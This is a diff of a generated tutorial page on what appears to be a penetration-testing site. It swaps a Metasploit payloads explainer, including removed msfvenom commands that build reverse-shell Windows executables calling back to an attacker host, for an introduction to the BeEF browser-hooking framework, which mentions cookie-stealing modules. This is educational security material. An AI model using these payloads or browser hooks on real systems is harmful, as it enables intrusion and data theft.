@@ -14,10 +14,10 @@
 
 <html lang="en-us"><head><script src="/tutorials/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=tutorials/livereload" data-no-instant defer></script>
     <meta charset="utf-8" />
-    <title>Understanding How Payloads Work in Metasploit | Tutorials</title>
+    <title>Introduction to BeEF: The Browser Exploitation Framework | Tutorials</title>
     <meta name="robots" content="noindex">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Learn more about the Metasploit framework.">
+    <meta name="description" content="Learn more about beEF">
     <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
     <meta name="author" content="Colin Wilson - Lotus Labs" />
     <meta name="email" content="support@aigis.uk" />
@@ -31,15 +31,15 @@
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/tutorials/favicons/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/tutorials/favicons/favicon-16x16.png">
 <link rel="manifest" crossorigin="use-credentials" href="http://localhost:1313/tutorials/favicons/site.webmanifest">
-<meta property="og:title" content="Understanding How Payloads Work in Metasploit" />
-<meta property="og:description" content="Learn more about the Metasploit framework." />
+<meta property="og:title" content="Introduction to BeEF: The Browser Exploitation Framework" />
+<meta property="og:description" content="Learn more about beEF" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/tutorials/docs/metasploit/metasploit/payloads_in_metasploit/" /><meta property="og:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_74176830535375333.png"/><meta property="article:section" content="docs" />
+<meta property="og:url" content="http://localhost:1313/tutorials/docs/beef/beef/introduction_to_beef/" /><meta property="og:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_10681951344952307360.png"/><meta property="article:section" content="docs" />
 
-<meta property="article:modified_time" content="2024-06-26T05:12:48+02:00" /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_74176830535375333.png"/>
-<meta name="twitter:title" content="Understanding How Payloads Work in Metasploit"/>
-<meta name="twitter:description" content="Learn more about the Metasploit framework."/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://localhost:1313/tutorials/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_10681951344952307360.png"/>
+<meta name="twitter:title" content="Introduction to BeEF: The Browser Exploitation Framework"/>
+<meta name="twitter:description" content="Learn more about beEF"/>
 
     
     <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
@@ -89,12 +89,12 @@
                 
                     
                     
-                        <li class="sidebar-dropdown  ">
+                        <li class="sidebar-dropdown  current active">
                             <button class="btn">
                                 <i class="material-icons me-2">code</i>
                                 beEF
                             </button>
-                            <div class="sidebar-submenu ">
+                            <div class="sidebar-submenu d-block">
                                 <ul>
                                     
                                         
@@ -109,7 +109,7 @@
                                     
                                         
                                         
-                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/beef/beef/introduction_to_beef/">Introduction to BeEF: The Browser Exploitation Framework</a></li>
+                                            <li class="current "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/beef/beef/introduction_to_beef/">Introduction to BeEF: The Browser Exploitation Framework</a></li>
                                         
                                     
                                 </ul>
@@ -179,12 +179,12 @@
                 
                     
                     
-                        <li class="sidebar-dropdown  current active">
+                        <li class="sidebar-dropdown  ">
                             <button class="btn">
                                 <i class="material-icons me-2">code</i>
                                 Metasploit
                             </button>
-                            <div class="sidebar-submenu d-block">
+                            <div class="sidebar-submenu ">
                                 <ul>
                                     
                                         
@@ -224,7 +224,7 @@
                                     
                                         
                                         
-                                            <li class="current "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/metasploit/metasploit/payloads_in_metasploit/">Understanding How Payloads Work in Metasploit</a></li>
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/metasploit/metasploit/payloads_in_metasploit/">Understanding How Payloads Work in Metasploit</a></li>
                                         
                                     
                                 </ul>
@@ -400,15 +400,15 @@
             
             
                 <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                    <a itemprop="item" href="/tutorials/docs/metasploit/">
-                        <span itemprop="name">Metasploit</span>
+                    <a itemprop="item" href="/tutorials/docs/beef/">
+                        <span itemprop="name">beEF</span>
                     </a>
                     <meta itemprop="position" content='2' />
                 </li>
             
         
             <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                <span itemprop="name">Understanding How Payloads Work in Metasploit</span>
+                <span itemprop="name">Introduction to BeEF: The Browser Exploitation Framework</span>
                 <meta itemprop="position" content='3' />
             </li>
         
@@ -421,26 +421,15 @@
     <div class="fw-bold text-uppercase mb-2">On this page</div>
     <nav id="toc">
   <ul>
-    <li><a href="#understanding-how-payloads-work-in-metasploit">Understanding How Payloads Work in Metasploit</a>
+    <li>
       <ul>
-        <li><a href="#what-are-payloads">What are Payloads?</a>
+        <li>
           <ul>
-            <li><a href="#naming-conventions">Naming Conventions</a></li>
+            <li><a href="#getting-and-installing-beef">Getting and Installing beEF</a></li>
+            <li><a href="#starting-beef">Starting beEF</a></li>
+            <li><a href="#exploring-the-different-sections-within-beef">Exploring the Different Sections within BeEF</a></li>
           </ul>
         </li>
-        <li><a href="#types-of-payloads">Types of Payloads</a>
-          <ul>
-            <li><a href="#singles">Singles</a></li>
-            <li><a href="#stagers">Stagers</a></li>
-            <li><a href="#stages">Stages</a></li>
-          </ul>
-        </li>
-        <li><a href="#delivering-staged-payloads">Delivering Staged Payloads</a>
-          <ul>
-            <li><a href="#communication-mechanisms">Communication Mechanisms</a></li>
-          </ul>
-        </li>
-        <li><a href="#conclusion">Conclusion</a></li>
       </ul>
     </li>
   </ul>
@@ -454,26 +443,15 @@
                                         </button>
 <nav id="toc-mobile">
   <ul class="dropdown-menu">
-    <li><a href="#understanding-how-payloads-work-in-metasploit">Understanding How Payloads Work in Metasploit</a>
+    <li>
       <ul>
-        <li><a href="#what-are-payloads">What are Payloads?</a>
+        <li>
           <ul>
-            <li><a href="#naming-conventions">Naming Conventions</a></li>
+            <li><a href="#getting-and-installing-beef">Getting and Installing beEF</a></li>
+            <li><a href="#starting-beef">Starting beEF</a></li>
+            <li><a href="#exploring-the-different-sections-within-beef">Exploring the Different Sections within BeEF</a></li>
           </ul>
         </li>
-        <li><a href="#types-of-payloads">Types of Payloads</a>
-          <ul>
-            <li><a href="#singles">Singles</a></li>
-            <li><a href="#stagers">Stagers</a></li>
-            <li><a href="#stages">Stages</a></li>
-          </ul>
-        </li>
-        <li><a href="#delivering-staged-payloads">Delivering Staged Payloads</a>
-          <ul>
-            <li><a href="#communication-mechanisms">Communication Mechanisms</a></li>
-          </ul>
-        </li>
-        <li><a href="#conclusion">Conclusion</a></li>
       </ul>
     </li>
   </ul>
@@ -484,37 +462,23 @@
                                             <i class="material-icons title-icon me-2">code</i>
                                             
                                             <h1 class="content-title mb-0">
-                                                Understanding How Payloads Work in Metasploit
+                                                Introduction to BeEF: The Browser Exploitation Framework
                                                 
                                             </h1>
                                         </div>
                                         
-                                            <p class="lead mb-3">Learn more about the Metasploit framework.</p>
+                                            <p class="lead mb-3">Learn more about beEF</p>
                                         
                                         <div id="content" class="main-content" data-bs-spy="scroll" data-bs-root-margin="0px 0px -65%" data-bs-target="#toc-mobile">
                                             
     
     <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
-        <h1 id="understanding-how-payloads-work-in-metasploit">Understanding How Payloads Work in Metasploit <a href="#understanding-how-payloads-work-in-metasploit" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>The Metasploit Framework is a powerful tool used for developing, testing, and executing exploits against remote targets. One of the critical components in this process is the payload. This blog post aims to break down the functionality of payloads in Metasploit, explaining their types and how they are used.</p>
-<h2 id="what-are-payloads">What are Payloads? <a href="#what-are-payloads" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>In Metasploit, payloads are modules that are used to execute code on a target system. They are stored in the directory <code>modules/payloads/{singles, stages, stagers}/&lt;platform&gt;</code>. When the framework starts, it combines stages with stagers to create a complete payload ready for use in exploits. Handlers are then paired with these payloads to manage the sessions and communication mechanisms.</p>
-<h3 id="naming-conventions">Naming Conventions <a href="#naming-conventions" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>Payloads in Metasploit are given reference names that describe their components:</p>
-<ul>
-<li><strong>Staged payloads</strong>: <code>&lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</code></li>
-<li><strong>Single payloads</strong>: <code>&lt;platform&gt;/[arch]/&lt;single&gt;</code></li>
-</ul>
-<p>For example, the payload <code>windows/x64/meterpreter/reverse_tcp</code> breaks down as follows:</p>
-<ul>
-<li><strong>Platform</strong>: Windows</li>
-<li><strong>Architecture</strong>: x64</li>
-<li><strong>Stage</strong>: Meterpreter</li>
-<li><strong>Stager</strong>: Reverse TCP</li>
-</ul>
-<p>In some cases, the architecture might be optional. For instance, <code>php/meterpreter/reverse_tcp</code> does not include an architecture because PHP payloads deliver interpreted code rather than native binaries.</p>
-<h2 id="types-of-payloads">Types of Payloads <a href="#types-of-payloads" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="singles">Singles <a href="#singles" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>Single payloads are &ldquo;fire-and-forget.&rdquo; They execute the payload code immediately without requiring any further communication with the Metasploit framework. This type of payload is useful in scenarios where the target has no network access, such as when using a file format exploit delivered via a USB drive.</p>
-<h3 id="stagers">Stagers <a href="#stagers" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>Stagers are small payloads designed to establish a communication channel and then load a larger, more complex payload. Using a stager allows for the initial payload to be small and quick to execute, which is useful for bypassing size restrictions and avoiding detection. The stager sets up the communication channel and passes control to the next stage, which is the more significant part of the payload.</p>
-<h3 id="stages">Stages <a href="#stages" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>Stages are the larger payloads that the stager loads into memory. They can be arbitrarily large since the stager handles any size restrictions. This allows stages to be written in higher-level languages like C, providing more functionality and complexity in the final payload.</p>
-<h2 id="delivering-staged-payloads">Delivering Staged Payloads <a href="#delivering-staged-payloads" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>When delivering staged payloads, the IP address and port that the payload should connect back to are embedded in the stager. All staged payloads consist of a small stub that sets up communication and executes the next stage.</p>
-<p>To create an executable using a staged payload, you would use the following commands in Metasploit&rsquo;s msfvenom:</p>
+        <p>BeEF, the Browser Exploitation Framework, is an indispensable tool for ethical hackers aiming to identify and exploit vulnerabilities within web browsers. While many security tools concentrate on system or server-side vulnerabilities, BeEF zeroes in on the client side—specifically, the user&rsquo;s web browser. This focus is crucial because, regardless of the security measures implemented on a network or operating system, vulnerabilities in a web browser can still provide a gateway for attackers to infiltrate the system.</p>
+<p>In contrast to other security tools that emphasize safeguarding networks or operating systems, BeEF&rsquo;s specialty lies in exposing the often-overlooked weak points within web browsers. This distinction highlights the significant threat posed by browser vulnerabilities, which can undermine the security of an entire network. Ethical hackers leverage BeEF to simulate attacks, demonstrating how a seemingly secure system can be compromised through the user&rsquo;s browser.</p>
+<p>BeEF&rsquo;s interface is designed for ease of use, featuring a web-based dashboard that facilitates the control and monitoring of &ldquo;hooked&rdquo; web browsers. The core of BeEF&rsquo;s functionality is the &ldquo;hook.js&rdquo; JavaScript file. Once this file is loaded by a target&rsquo;s browser, it establishes a communication channel with the BeEF server, enabling the collection of extensive data about the browser environment. This includes browser type, version, installed plugins, and other critical information that can be used to identify potential vulnerabilities.</p>
+<p>For ethical hackers, BeEF offers several distinct advantages. Firstly, it enables in-depth browser analysis, providing detailed insights into the hooked browsers. Information such as the browser type, version, installed plugins, and cookies can be invaluable for assessing security postures. Moreover, BeEF&rsquo;s numerous command modules facilitate a range of client-side exploitation techniques. These modules can perform tasks such as stealing cookies, conducting social engineering attacks, and launching network attacks, among others.</p>
+<p>Additionally, BeEF excels in simulating real-world attack scenarios, allowing organizations to better understand their risk exposures. By mimicking the tactics of malicious hackers, ethical hackers can use BeEF to test and improve their defenses. BeEF also offers the capability for persistent access, maintaining control over a hooked browser even if the IP address changes, thus providing ongoing access for further exploitation. Finally, BeEF&rsquo;s user-friendly web-based interface simplifies the management of hooked browsers and execution of command modules, making it a powerful yet accessible tool for ethical hacking.</p>
+<h3 id="getting-and-installing-beef">Getting and Installing beEF <a href="#getting-and-installing-beef" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>You can install beEF by running the commands:</p>
 
 
 
@@ -530,65 +494,45 @@
   
 
   <div class="prism-codeblock ">
-  <pre id="05c56da" class="language-bash ">
-  <code>msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
-msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
-msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</code>
+  <pre id="014bdc1" class="language-sh ">
+  <code>sudo apt update
+sudo apt install beef-xss</code>
   </pre>
   </div>
-<p>These commands create functionally identical executable files that differ only in randomization elements, making them unique.</p>
-<h3 id="communication-mechanisms">Communication Mechanisms <a href="#communication-mechanisms" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>The Ruby side of Metasploit acts as a client, using the transport mechanism set up by the stager (e.g., TCP, HTTP, HTTPS). Depending on the type of stage used:</p>
-<ul>
-<li><strong>Shell Stage</strong>: Metasploit connects the remote process’s standard input/output to your terminal.</li>
-<li><strong>Meterpreter Stage</strong>: Metasploit communicates using the Meterpreter protocol, offering more advanced features like file system navigation and command execution.</li>
-</ul>
-<h2 id="conclusion">Conclusion <a href="#conclusion" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>Understanding how payloads work in Metasploit is crucial for effectively using the framework to exploit and manage remote systems. By combining singles, stagers, and stages, Metasploit allows for flexible and powerful payload delivery, making it a versatile tool for penetration testers and security professionals.</p>
-<p>By mastering the components and delivery methods of Metasploit payloads, you can leverage the full capabilities of this powerful framework in your security assessments and exploit development.</p>
+<h3 id="starting-beef">Starting beEF <a href="#starting-beef" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>Once beEF is installed, you can run it by:</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="3f48058" class="language-sh ">
+  <code>sudo beef-xss</code>
+  </pre>
+  </div>
+<p>When running the program for the first time, you will be prompted to change the default password for the ‘beef’ user.</p>
+<p>&ndash;&gt; img</p>
+<p>Once you change the password, BeEF will start loading, and you will be presented with both the WebUI address and the hook script for <code>hook.js</code>.</p>
+<p>&mdash;&gt;img</p>
+<p>BeEF should open the browser for you, and you will need to log in as the user ‘beef’ with the new password you set up before entering the program.</p>
+<h3 id="exploring-the-different-sections-within-beef">Exploring the Different Sections within BeEF <a href="#exploring-the-different-sections-within-beef" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><h4 id="hooked-browsers">Hooked Browsers <a href="#hooked-browsers" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>This section displays a list of all currently hooked browsers. Each browser entry includes details such as the IP address, browser name, and operating system. Initially, this section will be empty as no browsers are hooked.</p>
+<h4 id="getting-started">Getting Started <a href="#getting-started" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>The Getting Started section offers guidance on utilizing the BeEF framework. It provides instructions on how to hook a browser and use the available command modules effectively.</p>
+<h4 id="logs">Logs <a href="#logs" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>The Logs section records BeEF activity, including interactions with target browsers, commands sent, responses received, and any errors or important system messages. This log is crucial for tracking the framework&rsquo;s operations and troubleshooting issues.</p>
+<h4 id="zombies">Zombies <a href="#zombies" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>In BeEF terminology, a &ldquo;zombie&rdquo; refers to a hooked browser under the control of the BeEF server. The Zombies section lists these browsers and enables interaction with them. Like the Hooked Browsers section, it will initially be empty until browsers are hooked.</p>
+<h4 id="basic">Basic <a href="#basic" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>This view presents basic information about the hooked browser, such as its IP address, browser type, and operating system. From this view, you can also utilize available command modules to interact with the hooked browser.</p>
+<h4 id="requester">Requester <a href="#requester" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h4><p>The Requester view allows you to manually craft and send HTTP requests from the hooked browser. This feature is useful for exploring websites or web applications from the hooked browser&rsquo;s perspective, testing access controls, or conducting other manual testing tasks.</p>
+<p>Once a browser is hooked, the Hooked Browsers and Zombies sections will populate with information, enabling you to interact with the hooked browsers using the BeEF command modules.</p>
 
     </div>
-
-    
-
-
-
-
-
-    
-    
-
-
-
-
-
-
-<div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3">
-    <div id="edit-this-page" class="mt-1">
-        <a href="https://github.com/AkhilSharma90/Armur-Tutorials/blob/release/content/docs/Metasploit/Metasploit/payloads_in_metasploit.md" alt="Understanding How Payloads Work in Metasploit" rel="noopener noreferrer" target="_blank">
-            
-            <span class="me-1 align-text-bottom">
-                
-                    <svg width="20px" height="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
-  <path d="M16 0.396c-8.839 0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183 0.803 0.151 1.093-0.344 1.093-0.772 0-0.38-0.009-1.385-0.015-2.719-4.453 0.964-5.391-2.151-5.391-2.151-0.729-1.844-1.781-2.339-1.781-2.339-1.448-0.989 0.115-0.968 0.115-0.968 1.604 0.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328 0.14-1.031 0.557-1.74 1.011-2.135-3.552-0.401-7.287-1.776-7.287-7.907 0-1.751 0.62-3.177 1.645-4.297-0.177-0.401-0.719-2.031 0.141-4.235 0 0 1.339-0.427 4.4 1.641 1.281-0.355 2.641-0.532 4-0.541 1.36 0.009 2.719 0.187 4 0.541 3.043-2.068 4.381-1.641 4.381-1.641 0.859 2.204 0.317 3.833 0.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297 0 6.145-3.74 7.5-7.296 7.891 0.556 0.479 1.077 1.464 1.077 2.959 0 2.14-0.020 3.864-0.020 4.385 0 0.416 0.28 0.916 1.104 0.755 6.4-2.093 10.979-8.093 10.979-15.156 0-8.833-7.161-16-16-16z"/>
-</svg>
-
-                
-            </span>
-            Edit this page
-            
-        </a>
-    </div>
-    
-    <div id="last-modified" class="mt-1">
-        <p class="mb-0 fw-semibold">Last updated <span
-            id="relativetime"
-            data-authdate="2024-06-26T05:12:48&#43;0200"
-            title="26 Jun 2024, 05:12 SAST">
-            26 Jun 2024, 05:12 SAST
-        </span>. <span class="material-icons size-20 align-text-bottom opacity-75">history</span>
-        </p>
-    </div>
-    
-</div>
 
     
 
@@ -599,22 +543,22 @@ msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</code>
 
 	<div class="row flex-xl-nowrap ">
 	<div class="col-sm-6 pt-2 doc-next">
-		<a href="/tutorials/docs/linux-basics-for-hackers/linux-basics-for-hackers/file_permision_using_linux/">
+		<a href="/tutorials/docs/metasploit/metasploit/shell_metasploit/">
 			<div class="card h-100 my-1">
 				<div class="card-body py-2">
-                    <p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Understanding File Permissions in Linux</p>
-					<p class="card-text ms-2">Welcome to the basics of Linux …</p>
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> How to Use a Reverse Shell in Metasploit</p>
+					<p class="card-text ms-2">Learn more about the …</p>
 					
 				</div>
 			</div>
 		</a>
         </div>
 	<div class="col-sm-6 pt-2 doc-prev">
-		<a class="ms-auto" href="/tutorials/docs/john-the-ripper/john-the-ripper/introduction_to_john_the_ripper/">
+		<a class="ms-auto" href="/tutorials/docs/metasploit/metasploit/running_modules_using_metasploit/">
 			<div class="card h-100 my-1 text-end">
 				<div class="card-body py-2">
-                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Using John The Ripper <i class="material-icons align-middle">navigate_next</i></p>
-					<p class="card-text me-2">Learn how to use John The …</p>
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Introduction to Metasploit <i class="material-icons align-middle">navigate_next</i></p>
+					<p class="card-text me-2">Learn more about the …</p>
 					
 				</div>
 			</div>
